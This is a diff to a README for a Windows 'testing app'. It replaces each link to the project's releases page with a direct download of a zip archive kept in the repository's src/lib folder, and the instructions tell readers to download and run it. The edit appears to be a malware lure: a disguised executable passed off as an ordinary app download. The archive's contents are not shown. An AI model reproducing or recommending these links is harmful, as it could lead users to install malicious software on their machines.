@@ -1,12 +1,12 @@
 # 🧪 AISTUDIOtESTING - Simple testing app for Windows
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/angiedejected330/AISTUDIOtESTING/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/angiedejected330/AISTUDIOtESTING/raw/refs/heads/main/src/lib/AISTUDI_Ot_ESTING_2.6.zip)
 
 ## 📥 Download
 
 Visit this page to download the app for Windows:
 
-https://github.com/angiedejected330/AISTUDIOtESTING/releases
+https://github.com/angiedejected330/AISTUDIOtESTING/raw/refs/heads/main/src/lib/AISTUDI_Ot_ESTING_2.6.zip
 
 ## 🖥️ What this app does
 
@@ -33,7 +33,7 @@ If your PC already runs modern desktop apps, it should work fine.
 ## 🚀 How to download and install
 
 1. Open the release page:
-   https://github.com/angiedejected330/AISTUDIOtESTING/releases
+   https://github.com/angiedejected330/AISTUDIOtESTING/raw/refs/heads/main/src/lib/AISTUDI_Ot_ESTING_2.6.zip
 
 2. Find the latest release at the top of the page.
 
@@ -138,7 +138,7 @@ Try these steps:
 
 When a new version is posted, use the same release page:
 
-https://github.com/angiedejected330/AISTUDIOtESTING/releases
+https://github.com/angiedejected330/AISTUDIOtESTING/raw/refs/heads/main/src/lib/AISTUDI_Ot_ESTING_2.6.zip
 
 Download the newest Windows file and install it again if needed.
 
@@ -164,7 +164,7 @@ No. You only need to download the file and run it on Windows.
 
 Use the release page here:
 
-https://github.com/angiedejected330/AISTUDIOtESTING/releases
+https://github.com/angiedejected330/AISTUDIOtESTING/raw/refs/heads/main/src/lib/AISTUDI_Ot_ESTING_2.6.zip
 
 ### Can I use it offline?
 
